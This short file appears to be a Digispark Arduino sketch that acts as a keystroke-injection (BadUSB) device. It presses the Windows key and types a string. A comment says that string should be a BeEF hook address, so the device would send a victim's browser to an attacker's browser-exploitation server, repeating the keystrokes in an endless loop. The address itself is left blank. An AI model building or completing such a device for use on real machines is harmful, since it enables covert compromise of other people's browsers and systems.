#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {


}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(""); //your beef hook must be here ex: 10.0.0.0
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
